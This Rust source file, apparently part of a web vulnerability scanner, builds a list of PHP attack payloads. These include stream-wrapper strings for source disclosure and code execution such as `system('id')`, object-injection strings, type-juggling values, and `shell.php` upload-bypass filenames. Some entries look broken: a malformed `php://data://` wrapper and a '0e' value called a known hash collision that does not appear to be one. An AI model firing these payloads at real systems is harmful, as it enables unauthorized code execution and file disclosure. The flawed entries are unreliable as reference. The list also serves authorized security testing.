use super::TargetPayload;

pub fn get_payloads() -> Vec<TargetPayload> {
    let mut payloads = Vec::new();

    payloads.extend(get_wrapper_payloads());
    payloads.extend(get_serialization_payloads());
    payloads.extend(get_type_juggling_payloads());
    payloads.extend(get_file_upload_payloads());
    payloads.extend(get_weak_comparison_payloads());

    payloads
}

fn get_wrapper_payloads() -> Vec<TargetPayload> {
    vec![
        TargetPayload {
            payload: "php://filter/convert.base64-encode/resource=index.php".to_string(),
            description: "PHP filter base64 source disclosure".to_string(),
            category: "php-wrappers".to_string(),
        },
        TargetPayload {
            payload: "php://filter/read=string.rot13/resource=index.php".to_string(),
            description: "PHP filter rot13 source disclosure".to_string(),
            category: "php-wrappers".to_string(),
        },
        TargetPayload {
            payload: "php://input".to_string(),
            description: "PHP input wrapper for POST data".to_string(),
            category: "php-wrappers".to_string(),
        },
        TargetPayload {
            payload: "php://data://text/plain,<?php system('id'); ?>".to_string(),
            description: "PHP data wrapper code execution".to_string(),
            category: "php-wrappers".to_string(),
        },
        TargetPayload {
            payload: "php://data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==".to_string(),
            description: "PHP data wrapper base64 execution".to_string(),
            category: "php-wrappers".to_string(),
        },
        TargetPayload {
            payload: "expect://id".to_string(),
            description: "Expect wrapper command execution".to_string(),
            category: "php-wrappers".to_string(),
        },
        TargetPayload {
            payload: "phar://archive.tar/shell.php".to_string(),
            description: "Phar wrapper file inclusion".to_string(),
            category: "php-wrappers".to_string(),
        },
        TargetPayload {
            payload: "zip://archive.zip#shell.php".to_string(),
            description: "Zip wrapper file inclusion".to_string(),
            category: "php-wrappers".to_string(),
        },
    ]
}

fn get_serialization_payloads() -> Vec<TargetPayload> {
    vec![
        TargetPayload {
            payload: "O:8:\"stdClass\":1:{s:4:\"test\";s:4:\"data\";}".to_string(),
            description: "Basic PHP serialization test".to_string(),
            category: "serialization".to_string(),
        },
        TargetPayload {
            payload: "O:8:\"stdClass\":1:{s:4:\"test\";O:8:\"stdClass\":0:{}}".to_string(),
            description: "Nested object serialization".to_string(),
            category: "serialization".to_string(),
        },
        TargetPayload {
            payload: "a:1:{s:4:\"test\";s:4:\"data\";}".to_string(),
            description: "Array serialization test".to_string(),
            category: "serialization".to_string(),
        },
        TargetPayload {
            payload: "a:1:{i:0;O:8:\"stdClass\":0:{}}".to_string(),
            description: "Array with object".to_string(),
            category: "serialization".to_string(),
        },
        TargetPayload {
            payload: "O:3:\"PDO\":0:{}".to_string(),
            description: "PDO object injection test".to_string(),
            category: "serialization".to_string(),
        },
    ]
}

fn get_type_juggling_payloads() -> Vec<TargetPayload> {
    vec![
        TargetPayload {
            payload: "0e123456".to_string(),
            description: "MD5 type juggling (0e hash)".to_string(),
            category: "type-juggling".to_string(),
        },
        TargetPayload {
            payload: "0e46209743190650953453434".to_string(),
            description: "Known 0e hash collision".to_string(),
            category: "type-juggling".to_string(),
        },
        TargetPayload {
            payload: "true".to_string(),
            description: "Boolean true comparison".to_string(),
            category: "type-juggling".to_string(),
        },
        TargetPayload {
            payload: "1e1".to_string(),
            description: "Scientific notation".to_string(),
            category: "type-juggling".to_string(),
        },
        TargetPayload {
            payload: "0x10".to_string(),
            description: "Hexadecimal notation".to_string(),
            category: "type-juggling".to_string(),
        },
        TargetPayload {
            payload: "0".to_string(),
            description: "Zero comparison bypass".to_string(),
            category: "type-juggling".to_string(),
        },
        TargetPayload {
            payload: "".to_string(),
            description: "Empty string comparison".to_string(),
            category: "type-juggling".to_string(),
        },
        TargetPayload {
            payload: "[]".to_string(),
            description: "Empty array comparison".to_string(),
            category: "type-juggling".to_string(),
        },
    ]
}

fn get_file_upload_payloads() -> Vec<TargetPayload> {
    vec![
        TargetPayload {
            payload: "shell.php".to_string(),
            description: "Direct PHP extension".to_string(),
            category: "file-upload".to_string(),
        },
        TargetPayload {
            payload: "shell.php5".to_string(),
            description: "PHP5 extension variant".to_string(),
            category: "file-upload".to_string(),
        },
        TargetPayload {
            payload: "shell.phtml".to_string(),
            description: "PHTML extension".to_string(),
            category: "file-upload".to_string(),
        },
        TargetPayload {
            payload: "shell.php.jpg".to_string(),
            description: "Double extension".to_string(),
            category: "file-upload".to_string(),
        },
        TargetPayload {
            payload: "shell.php%00.jpg".to_string(),
            description: "Null byte extension".to_string(),
            category: "file-upload".to_string(),
        },
        TargetPayload {
            payload: "shell.php;.jpg".to_string(),
            description: "Semicolon extension bypass".to_string(),
            category: "file-upload".to_string(),
        },
        TargetPayload {
            payload: "shell.php\x00.jpg".to_string(),
            description: "Raw null byte".to_string(),
            category: "file-upload".to_string(),
        },
        TargetPayload {
            payload: "shell.php.png".to_string(),
            description: "Image extension disguise".to_string(),
            category: "file-upload".to_string(),
        },
    ]
}

fn get_weak_comparison_payloads() -> Vec<TargetPayload> {
    vec![
        TargetPayload {
            payload: "0 == \"admin\"".to_string(),
            description: "Weak comparison: 0 equals string".to_string(),
            category: "weak-comparison".to_string(),
        },
        TargetPayload {
            payload: "1 == \"1admin\"".to_string(),
            description: "Weak comparison: numeric string prefix".to_string(),
            category: "weak-comparison".to_string(),
        },
        TargetPayload {
            payload: "true == \"any\"".to_string(),
            description: "Weak comparison: true equals string".to_string(),
            category: "weak-comparison".to_string(),
        },
        TargetPayload {
            payload: "\"0e12345\" == \"0e54321\"".to_string(),
            description: "Weak comparison: 0e hash collision".to_string(),
            category: "weak-comparison".to_string(),
        },
    ]
}
